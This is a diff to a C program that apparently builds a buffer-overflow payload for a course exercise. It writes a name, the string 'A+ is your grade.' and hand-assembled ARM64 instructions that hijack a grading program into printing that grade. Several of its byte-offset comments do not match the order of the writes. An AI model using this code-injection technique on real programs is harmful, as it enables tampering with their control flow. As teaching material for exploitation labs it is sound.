@@ -6,36 +6,37 @@ int main(void) {
     int i; 
     unsigned long ulAddr;
     unsigned int uiAdr;
-    unsigned int uiBl;
     unsigned int uiB; 
+    unsigned int uiMov;
     
     FILE *psFile;
     psFile = fopen("dataAplus", "w");
 
-    /* Write name to file */
+    /* Write name and a null byte to buff[0]-buff[12] */
     fprintf(psFile, "Chewei Puaji");
     putc('\0', psFile);
 
-    /* Write gradeStr to file */
+    /* Write gradeStr to buff[13]-buff[29]*/
     fprintf(psFile, "A+ is your grade.");
 
+    /* put null bytes to buff[30]-buff[31] */
     for (i = 0; i < 2; i++) {
         putc('\0', psFile);
-    } 
+    }
 
-    /*  addr x0, &gradeStr */    
+    /*  addr x0, &gradeStr. put instruction to buff[36]-buff[39]*/    
     uiAdr = MiniAssembler_adr(0, 0x420065, 0x420078);
     fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);
 
-    /* bl x0 */
-    uiBl = MiniAssembler_bl(0x40086c, 0x42007C);
-    fwrite(&uiBl, sizeof(unsigned int), 1, psFile); 
+    /* mov x1, '\n' to buff[32]-buff[35]*/
+    uiMov = MiniAssembler_mov(1, '\n');
+    fwrite(&uiMov, sizeof(unsigned int), 1, psFile);
 
-    /* b printf */
-    uiB = MiniAssembler_b(0x400878, 0x420080); 
+    /* b printf. put instrunction to buff[40]-buff[43]*/
+    uiB = MiniAssembler_b(0x400874, 0x420080); 
     fwrite(&uiB, sizeof(unsigned int), 1, psFile);
 
-    /* Fill in null bytes to reach the end of buf array */
+    /* Fill in null bytes to reach the end of buf array to buff[44]-buff[47]*/
     for (i = 0; i < 4; i++) {
         putc('\0', psFile);
     }
@@ -47,5 +48,4 @@ int main(void) {
     /* Close the file and return 0 */
     fclose(psFile); 
     return 0; 
-
 }
